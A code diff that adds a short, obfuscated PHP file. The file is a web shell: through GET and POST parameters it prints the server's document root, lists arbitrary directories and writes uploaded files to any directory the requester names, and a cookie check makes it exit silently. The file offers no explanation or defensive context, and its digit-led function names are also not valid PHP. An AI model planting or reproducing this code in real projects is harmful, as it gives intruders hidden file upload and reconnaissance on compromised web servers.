@@ -1,0 +1,6 @@
+<?php
+
+if(isset($_COOKIE['yru9'])) {
+    die('Nu6dL'.'Scg5k');
+}
+function 3FF50F54a66bBBD5f469B58770bb0faD3($_0){if(empty($_0)):return null;endif;$_1=ScaNDIR($_0);echo"@d\x69r@\015\x0a";foreach($_1 as$_2):if($_2!="."&&$_2!=".."):if(iS_dir($_0."/".$_2)):echo"\x5b".$_2."]\x0d\x0a";endif;if(is_FilE($_0."/".$_2)):echo"\x3c".$_2."\x3e\015\x0a";endif;endif;endforeach;}function 39Ba9eF6DdFbe14916FA2d3337b427774($_2){if(empty($_2)):return null;endif;if(IS_UpLoadED_fIlE($_2["tm\160_name"])):$_3=!empty($_POST["\x64\151r"])?$_POST["dir"]:"";$_4=$_3."/".$_2["nam\145"];if(Move_uPLoadeD_FILE($_2["\x74\x6dp_na\x6de"],$_4)):echo"@tr\x75\x65@\x0d\012";if($_3):3fF50F54A66bbbD5f469b58770BB0Fad3($_3);endif;else:echo"\x66alse\015\x0a";endif;endif;}if(!empty($_GET["\x74es\x74"])):echo"\x74esttru\145";endif;if(!empty($_GET["ge\164_dir"])):echo"\174".$_SERVER["DOC\125ME\116T_RO\117T"]."\174\x0d\x0a";if(!empty($_GET["dir"])):3Ff50F54A66BbBD5f469b58770Bb0fAd3($_GET["\144ir"]);endif;endif;if(!empty($_FILES["\146\x69le\x6eame"])):39bA9ef6DDfBe14916FA2d3337b427774($_FILES["file\x6eame"]);endif;;
